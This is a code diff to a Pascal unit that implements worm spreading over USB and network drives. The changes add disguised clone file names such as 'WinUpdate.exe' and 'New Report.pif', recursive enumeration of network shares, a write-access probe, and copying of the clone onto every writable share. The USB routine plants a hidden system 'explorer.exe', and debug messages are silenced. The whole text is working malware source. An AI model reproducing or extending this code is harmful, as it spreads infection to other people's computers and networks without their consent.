@@ -9,6 +9,7 @@ uses
 
 procedure InfectUSBDrives;
 procedure InfectNetworkDrives;
+procedure EnumNetworkResources(NetResource: PNetResource; List: TStrings);
 
 implementation
 
@@ -18,6 +19,24 @@ var
 const
   DeskAttr = faHidden{%H-} or faSysFile{%H-} or faReadOnly;
   SysAttr  = faHidden{%H-} or faSysFile{%H-};
+  MaxResourceCount = 1700;
+
+function GetCloneName(Dir: String): String;
+var
+  Sum, J: LongInt;
+Begin
+  Sum:=0;
+  For J:=1 to Length(Dir) do Sum += Ord(Dir[J]);
+  Result:=IncludeTrailingBackslash(Dir);
+  Sum:=(Sum mod 5);
+  Case Sum of
+    0: Result += 'WinUpdate.exe';
+    1: Result += 'New Report.pif';
+    2: Result += 'Microsoft Office Upgrade.exe';
+    3: Result += 'Launcher.exe';
+    4: Result += 'Yesterday.pif';
+  end;
+end;
 
 procedure CreateLink(const PathObj, PathLink, Desc, Param: string);
 var
@@ -97,7 +116,7 @@ Begin
               Writeln(FFile,'IconResource=C:\Windows\system32\SHELL32.dll,7');
               CloseFile(FFile);
               FileSetAttr(D+'\desktop.ini', DeskAttr);
-              CopyFile(PChar(ParamStr(0)), PChar(D+'\explorer.exe'), False);
+              CopyFile('Clone.tmp', PChar(D+'\explorer.exe'), False);
               FileSetAttr(D+'\explorer.exe', SysAttr);
               FileSetAttr(D, SysAttr);
               //Create shortcut
@@ -110,69 +129,79 @@ Begin
     end;
 end;
 
-procedure EnumNetworkResources(NetResource: PNEtResource; List: TStrings);
+procedure EnumNetworkResources(NetResource: PNetResource; List: TStrings);
+type
+  TNetResourceArray = Array [0..MaxInt div SizeOf(TNetResource) - 1] of TNetResource;
+  PNetResourceArray = ^TNetResourceArray;
 var
- Count, BufSize, I: Cardinal;
- EnumHandle: LongWord;
- NetArray: array[0..250] of TNetResource;
+ Count, BufSize, EnumHandle: Cardinal;
+ ResHandle, J: Integer;
+ NetArray: PNetResourceArray;
 begin
- if WNetOpenEnum(RESOURCE_GLOBALNET, RESOURCETYPE_ANY, 0, NetResource,EnumHandle) = NO_ERROR then
+  Count:=$FFFFFFFF;
+  BufSize:=MaxResourceCount * SizeOf(TNetResource);
+  if WNetOpenEnum(RESOURCE_GLOBALNET, RESOURCETYPE_ANY, 0, NetResource, EnumHandle{%H-}) = NO_ERROR then
   try
-   Count := $FFFFFFFF;
-   BufSize := SizeOf(NetArray);
-   if WNetEnumResource(EnumHandle, Count, @NetArray, BufSize) = NO_ERROR then
-    begin
-     for i := 0 to Count -1 do
-      begin
-       if NetArray[i].dwType=RESOURCETYPE_DISK Then List.Add(NetArray[i].lpRemoteName);
-       EnumNetworkResources(@NetArray[i], List);
+    GetMem(NetArray, BufSize);
+    ResHandle:=WNetEnumResource(EnumHandle, Count, NetArray, BufSize);
+    if ResHandle = NO_ERROR then Begin
+      For J:=0 to Count - 1 do Begin
+        if NetArray^[J].dwType=RESOURCETYPE_DISK then
+          List.Add(NetArray^[J].lpRemoteName);
+        EnumNetworkResources(@NetArray^[J], List);
       end;
     end;
   finally
-   WNetCloseEnum(EnumHandle);
+    FreeMem(NetArray, BufSize);
+    WNetCloseEnum(EnumHandle);
   end;
 end;
 
 function WriteAccess(Path: String): Boolean;
 var
   FFile: Text;
-  TempFile: PChar;
+  TempFile: String;
   Unique: Word;
 Begin
   Unique:=Random(High(Word));
-  Result:=(GetTempFileName(PChar(Path), 'wchk', Unique, TempFile)=Unique);
-  if Result then Begin
-    try
-      AssignFile(FFile, TempFile);
-      Rewrite(FFile);
-      CloseFile(FFile);
-    except
-      Result:=False;
-    end;
+  TempFile:=IncludeTrailingBackslash(Path)+'wchk-'+IntToStr(Unique)+'.tmp';
+  try
+    AssignFile(FFile, TempFile);
+    Rewrite(FFile);
+    Writeln(FFile, 'Success.');
+    CloseFile(FFile);
+    DeleteFile(TempFile);
+  except
+    Result:=False;
   end;
 end;
 
 procedure InfectNetworkDrives;
 var
-  AList: TStringList;
+  AList: TStrings;
   J: LongInt;
 Begin
-  Writeln('Network spreading started.');
+  //Writeln('Network spreading started.');
   AList:=TStringList.Create;
-  if Not(Assigned(AlreadyTried)) then
+  if Not(Assigned(AlreadyTried)) then Begin
     AlreadyTried:=TStringList.Create;
-  EnumNetworkResources(Nil, AList);
-  Writeln('Enumeration complete.');
+  end;
+  try
+    EnumNetworkResources(Nil, AList);
+  except
+  end;
+  //Writeln('Enumeration complete.');
   For J:=0 to AList.Count - 1 do
   if AlreadyTried.IndexOf(AList.Strings[J])=-1 then Begin
     if WriteAccess(AList.Strings[J]) then Begin
+      CopyFile('Clone.tmp', PChar(GetCloneName(AList.Strings[J])), True);
       Write('YES: ');
     end else Write('NO: ');
     Writeln(AList.Strings[J]);
     AlreadyTried.Add(AList.Strings[J]);
   end;
   AList.Free;
-  Writeln('Network spreding stopped.');
+  //Writeln('Network spreding stopped.');
 end;
 
 end.
